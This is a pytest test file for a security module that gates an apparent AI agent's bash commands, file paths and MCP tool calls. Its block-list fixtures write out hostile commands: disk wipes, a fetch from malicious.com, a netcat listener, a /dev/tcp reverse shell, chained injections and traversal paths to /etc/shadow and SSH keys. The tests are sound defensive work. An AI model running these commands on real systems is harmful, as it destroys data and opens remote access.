"""Unit Tests for Security Enforcement Module (AI-113).

Tests cover all 8 test steps from the issue:
1. Try to execute bash command not in allowlist - verify rejection
2. Try to access files outside project directory - verify rejection
3. Verify bash commands in allowlist are allowed
4. Verify file operations within project directory work
5. Verify MCP tool calls check authorization
6. Test security with malicious inputs
7. Verify error messages don't leak sensitive info
8. Test concurrent security checks
"""

import asyncio
import pytest
from pathlib import Path
import tempfile
import shutil

from dashboard.security_enforcement import (
    SecurityEnforcement,
    SecurityCheckResult,
    get_security_enforcer
)


class TestBashCommandValidation:
    """Test Step 1 & 3: Bash command allowlist validation."""

    @pytest.mark.asyncio
    async def test_bash_command_not_in_allowlist_rejected(self):
        """Test Step 1: Command not in allowlist is rejected."""
        enforcer = SecurityEnforcement()

        # Test various commands not in allowlist
        blocked_commands = [
            "sudo rm -rf /",
            "nc -l 4444",
            "wget http://malicious.com/script.sh",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            "systemctl stop firewalld",
            "/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
            "ruby malicious_script.rb",
            "perl -e 'print malicious_code'",
        ]

        for command in blocked_commands:
            result = await enforcer.validate_bash_command(command)
            assert not result.allowed, f"Command should be blocked: {command}"
            assert result.reason != "", "Reason should be provided"
            assert "not in the allowed commands list" in result.reason or "not allowed" in result.sanitized_error.lower()

    @pytest.mark.asyncio
    async def test_bash_commands_in_allowlist_allowed(self):
        """Test Step 3: Commands in allowlist are allowed."""
        enforcer = SecurityEnforcement()

        # Test commands that are in the allowlist
        allowed_commands = [
            "ls -la",
            "cat README.md",
            "grep 'pattern' file.txt",
            "find . -name '*.py'",
            "git status",
            "python3 script.py",
            "npm install",
            "curl http://localhost:8080/health",
        ]

        for command in allowed_commands:
            result = await enforcer.validate_bash_command(command)
            assert result.allowed, f"Command should be allowed: {command}"

    @pytest.mark.asyncio
    async def test_empty_bash_command_rejected(self):
        """Empty commands are rejected."""
        enforcer = SecurityEnforcement()

        result = await enforcer.validate_bash_command("")
        assert not result.allowed
        assert "empty" in result.sanitized_error.lower()

        result = await enforcer.validate_bash_command("   ")
        assert not result.allowed

    @pytest.mark.asyncio
    async def test_dangerous_rm_commands_rejected(self):
        """Test Step 1: Dangerous rm commands are rejected."""
        enforcer = SecurityEnforcement()

        dangerous_rm_commands = [
            "rm -rf /",
            "rm -rf /etc",
            "rm -rf /usr",
            "rm -rf /*",
            "rm -rf /home",
        ]

        for command in dangerous_rm_commands:
            result = await enforcer.validate_bash_command(command)
            assert not result.allowed, f"Dangerous rm should be blocked: {command}"

    @pytest.mark.asyncio
    async def test_safe_rm_commands_allowed(self):
        """Test Step 3: Safe rm commands are allowed."""
        enforcer = SecurityEnforcement()

        safe_rm_commands = [
            "rm file.txt",
            "rm -rf node_modules",
            "rm -rf build/",
            "rm -f temp.log",
        ]

        for command in safe_rm_commands:
            result = await enforcer.validate_bash_command(command)
            assert result.allowed, f"Safe rm should be allowed: {command}"

    @pytest.mark.asyncio
    async def test_pkill_validation(self):
        """Test Step 1 & 3: pkill command validation."""
        enforcer = SecurityEnforcement()

        # Allowed pkill commands (dev processes)
        allowed_pkill = [
            "pkill node",
            "pkill npm",
            "pkill vite",
        ]

        for command in allowed_pkill:
            result = await enforcer.validate_bash_command(command)
            assert result.allowed, f"pkill dev process should be allowed: {command}"

        # Blocked pkill commands (system processes)
        blocked_pkill = [
            "pkill -9 systemd",
            "pkill sshd",
            "pkill postgres",
        ]

        for command in blocked_pkill:
            result = await enforcer.validate_bash_command(command)
            assert not result.allowed, f"pkill system process should be blocked: {command}"


class TestFilePathValidation:
    """Test Step 2 & 4: File path validation."""

    def test_file_path_outside_project_rejected(self):
        """Test Step 2: Files outside project directory are rejected."""
        with tempfile.TemporaryDirectory() as tmpdir:
            project_root = Path(tmpdir) / "project"
            project_root.mkdir()

            enforcer = SecurityEnforcement(project_root=project_root)

            # Test various attempts to escape project directory
            forbidden_paths = [
                "../../etc/passwd",
                "/etc/shadow",
                "/root/.ssh/id_rsa",
                "../../../etc/hosts",
                "/home/user/.bashrc",
                str(Path(tmpdir) / "outside.txt"),  # Same parent, but outside project
            ]

            for path in forbidden_paths:
                result = enforcer.validate_file_path(path)
                assert not result.allowed, f"Path should be rejected: {path}"
                assert "outside project directory" in result.sanitized_error.lower()

    def test_file_path_within_project_allowed(self):
        """Test Step 4: Files within project directory are allowed."""
        with tempfile.TemporaryDirectory() as tmpdir:
            project_root = Path(tmpdir)
            enforcer = SecurityEnforcement(project_root=project_root)

            # Test valid paths within project
            allowed_paths = [
                "src/main.py",
                "./README.md",
                "tests/test_example.py",
                "config/settings.json",
                ".",  # Current directory
            ]

            for path in allowed_paths:
                result = enforcer.validate_file_path(path)
                assert result.allowed, f"Path should be allowed: {path}"

    def test_symlink_resolution_prevents_bypass(self):
        """Test Step 2: Symlinks are resolved to prevent bypass."""
        with tempfile.TemporaryDirectory() as tmpdir:
            project_root = Path(tmpdir) / "project"
            project_root.mkdir()

            # Create a directory outside project
            outside_dir = Path(tmpdir) / "outside"
            outside_dir.mkdir()

            # Create a symlink inside project pointing outside
            symlink_path = project_root / "malicious_link"
            symlink_path.symlink_to(outside_dir)

            enforcer = SecurityEnforcement(project_root=project_root)

            # Try to access via symlink
            result = enforcer.validate_file_path(str(symlink_path / "secret.txt"))
            assert not result.allowed, "Symlink escape should be blocked"

    def test_empty_file_path_rejected(self):
        """Empty file paths are rejected."""
        enforcer = SecurityEnforcement()

        result = enforcer.validate_file_path("")
        assert not result.allowed
        assert "empty" in result.sanitized_error.lower()


class TestMCPToolValidation:
    """Test Step 5: MCP tool call authorization."""

    @pytest.mark.asyncio
    async def test_mcp_tool_without_auth_rejected(self):
        """Test Step 5: MCP tool calls without auth are rejected."""
        enforcer = SecurityEnforcement()

        result = await enforcer.validate_mcp_tool_call(
            tool_name="slack__send_message",
            tool_input={"channel": "#general", "message": "Hello"},
            auth_token=None
        )

        assert not result.allowed
        assert "authorization" in result.sanitized_error.lower()

    @pytest.mark.asyncio
    async def test_mcp_tool_with_invalid_auth_rejected(self):
        """Test Step 5: MCP tool calls with invalid auth are rejected."""
        enforcer = SecurityEnforcement()

        # Test with short/invalid token
        result = await enforcer.validate_mcp_tool_call(
            tool_name="slack__send_message",
            tool_input={"channel": "#general", "message": "Hello"},
            auth_token="short"
        )

        assert not result.allowed
        assert "authorization" in result.sanitized_error.lower()

    @pytest.mark.asyncio
    async def test_mcp_tool_with_valid_auth_allowed(self):
        """Test Step 5: MCP tool calls with valid auth are allowed."""
        enforcer = SecurityEnforcement()

        result = await enforcer.validate_mcp_tool_call(
            tool_name="slack__send_message",
            tool_input={"channel": "#general", "message": "Hello"},
            auth_token="valid-arcade-gateway-token-12345"
        )

        assert result.allowed

    @pytest.mark.asyncio
    async def test_mcp_tool_empty_name_rejected(self):
        """Empty tool names are rejected."""
        enforcer = SecurityEnforcement()

        result = await enforcer.validate_mcp_tool_call(
            tool_name="",
            tool_input={"test": "data"},
            auth_token="valid-token-12345"
        )

        assert not result.allowed
        assert "tool name" in result.sanitized_error.lower()


class TestMaliciousInputs:
    """Test Step 6: Security with malicious inputs."""

    @pytest.mark.asyncio
    async def test_command_injection_attempts(self):
        """Test Step 6: Command injection attempts are blocked."""
        enforcer = SecurityEnforcement()

        injection_attempts = [
            "ls; rm -rf /",  # Chained command with dangerous rm
            "ls; sudo reboot",  # Chained with sudo
            "ruby -e 'malicious code'",  # Ruby not in allowlist
            "perl -e 'system(rm)'",  # Perl not in allowlist
            "php -r 'malicious'",  # PHP not in allowlist
            "systemctl stop firewall",  # systemctl not in allowlist
        ]

        for command in injection_attempts:
            result = await enforcer.validate_bash_command(command)
            # Command should be blocked (contains blocked command or uses sudo)
            assert not result.allowed, f"Injection should be blocked: {command}"

    def test_path_traversal_attempts(self):
        """Test Step 6: Path traversal attempts are blocked."""
        with tempfile.TemporaryDirectory() as tmpdir:
            enforcer = SecurityEnforcement(project_root=Path(tmpdir))

            traversal_attempts = [
                "../../../etc/passwd",
                "../../../../../../etc/shadow",
                "/./././etc/hosts",
                "/etc/passwd",
                "/root/.ssh/id_rsa",
            ]

            for path in traversal_attempts:
                result = enforcer.validate_file_path(path)
                assert not result.allowed, f"Traversal should be blocked: {path}"

    @pytest.mark.asyncio
    async def test_null_byte_injection(self):
        """Test Step 6: Null byte injection is handled."""
        enforcer = SecurityEnforcement()

        # Null bytes in commands
        result = await enforcer.validate_bash_command("ls\x00rm -rf /")
        # Should either be rejected or sanitized
        # The shlex parser will handle this

    def test_unicode_bypass_attempts(self):
        """Test Step 6: Unicode bypass attempts are blocked."""
        with tempfile.TemporaryDirectory() as tmpdir:
            enforcer = SecurityEnforcement(project_root=Path(tmpdir))

            # Unicode directory traversal attempts
            unicode_attempts = [
                "\u002e\u002e/\u002e\u002e/etc/passwd",  # Unicode dots
                "../\uff0e\uff0e/etc/passwd",  # Fullwidth dots
            ]

            for path in unicode_attempts:
                result = enforcer.validate_file_path(path)
                # Should be handled by path resolution
                # If resolved path is outside, should be blocked


class TestInformationLeakage:
    """Test Step 7: Error messages don't leak sensitive info."""

    @pytest.mark.asyncio
    async def test_error_messages_sanitized(self):
        """Test Step 7: Error messages don't leak system information."""
        with tempfile.TemporaryDirectory() as tmpdir:
            project_root = Path(tmpdir)
            enforcer = SecurityEnforcement(project_root=project_root)

            # Try to access forbidden path
            result = enforcer.validate_file_path("/etc/passwd")

            # Error message should not contain full system paths
            assert "/etc/passwd" not in result.sanitized_error
            assert str(project_root) not in result.sanitized_error

            # Should have generic error message
            assert "outside project directory" in result.sanitized_error.lower()

    @pytest.mark.asyncio
    async def test_command_rejection_no_leak(self):
        """Test Step 7: Command rejection doesn't leak allowlist details."""
        enforcer = SecurityEnforcement()

        result = await enforcer.validate_bash_command("malicious_command")

        # Should not leak the full allowlist
        assert "ALLOWED_COMMANDS" not in result.sanitized_error
        # Should have generic error
        assert "not allowed" in result.sanitized_error.lower() or "security policy" in result.sanitized_error.lower()

    @pytest.mark.asyncio
    async def test_mcp_auth_error_no_leak(self):
        """Test Step 7: MCP auth errors don't leak token details."""
        enforcer = SecurityEnforcement()

        result = await enforcer.validate_mcp_tool_call(
            tool_name="test_tool",
            tool_input={},
            auth_token="bad"
        )

        # Should not leak specific token values
        assert "bad" not in result.sanitized_error
        # Should have generic error
        assert "authorization" in result.sanitized_error.lower()


class TestConcurrency:
    """Test Step 8: Concurrent security checks."""

    @pytest.mark.asyncio
    async def test_concurrent_bash_validation(self):
        """Test Step 8: Multiple concurrent bash validations work correctly."""
        enforcer = SecurityEnforcement()

        commands = [
            "ls -la",
            "cat file.txt",
            "grep pattern file",
            "sudo rm -rf /",  # This should be blocked
            "git status",
            "npm install",
        ]

        # Run all validations concurrently
        tasks = [enforcer.validate_bash_command(cmd) for cmd in commands]
        results = await asyncio.gather(*tasks)

        # Verify results
        assert len(results) == len(commands)

        # Check specific results
        for i, result in enumerate(results):
            if "sudo" in commands[i]:
                assert not result.allowed, f"Command should be blocked: {commands[i]}"
            elif commands[i] in ["ls -la", "cat file.txt", "git status"]:
                assert result.allowed, f"Command should be allowed: {commands[i]}"

    @pytest.mark.asyncio
    async def test_concurrent_file_validation(self):
        """Test Step 8: Multiple concurrent file validations work correctly."""
        with tempfile.TemporaryDirectory() as tmpdir:
            enforcer = SecurityEnforcement(project_root=Path(tmpdir))

            paths = [
                "src/main.py",
                "README.md",
                "../../etc/passwd",  # This should be blocked
                "tests/test.py",
                "/etc/shadow",  # This should be blocked
            ]

            # Run all validations concurrently
            results = [enforcer.validate_file_path(path) for path in paths]

            # Verify results
            assert len(results) == len(paths)

            # Check specific results
            for i, result in enumerate(results):
                if "/etc/" in paths[i]:
                    assert not result.allowed, f"Path should be blocked: {paths[i]}"
                elif paths[i] in ["src/main.py", "README.md", "tests/test.py"]:
                    assert result.allowed, f"Path should be allowed: {paths[i]}"

    @pytest.mark.asyncio
    async def test_concurrent_mcp_validation(self):
        """Test Step 8: Multiple concurrent MCP validations work correctly."""
        enforcer = SecurityEnforcement()

        tool_calls = [
            ("slack__send", {"msg": "hi"}, "valid-token-12345"),
            ("github__create_pr", {"title": "test"}, "valid-token-12345"),
            ("linear__create_issue", {"title": "bug"}, None),  # No auth
            ("jira__update_issue", {"id": "123"}, "valid-token-12345"),
        ]

        # Run all validations concurrently
        tasks = [
            enforcer.validate_mcp_tool_call(name, input_data, token)
            for name, input_data, token in tool_calls
        ]
        results = await asyncio.gather(*tasks)

        # Verify results
        assert len(results) == len(tool_calls)

        # Check that the one without auth is rejected
        assert not results[2].allowed, "MCP call without auth should be blocked"

        # Check that ones with auth are allowed
        assert results[0].allowed
        assert results[1].allowed
        assert results[3].allowed

    @pytest.mark.asyncio
    async def test_concurrent_safety_lock(self):
        """Test Step 8: Concurrent safety lock mechanism."""
        enforcer = SecurityEnforcement()

        # Test the lock mechanism
        tasks = [enforcer.check_concurrent_safety() for _ in range(10)]
        results = await asyncio.gather(*tasks)

        # All should succeed (lock should be acquirable)
        assert all(results), "All concurrent safety checks should succeed"


class TestGlobalEnforcer:
    """Test global enforcer singleton."""

    def test_get_security_enforcer_singleton(self):
        """Test that get_security_enforcer returns singleton."""
        enforcer1 = get_security_enforcer()
        enforcer2 = get_security_enforcer()

        assert enforcer1 is enforcer2, "Should return same instance"

    def test_get_security_enforcer_with_project_root(self):
        """Test that project_root is set on first call."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Reset singleton by accessing private variable
            import dashboard.security_enforcement as se_module
            se_module._security_enforcer = None

            enforcer = get_security_enforcer(project_root=Path(tmpdir))
            assert enforcer.project_root == Path(tmpdir).resolve()


# Run tests with pytest
if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
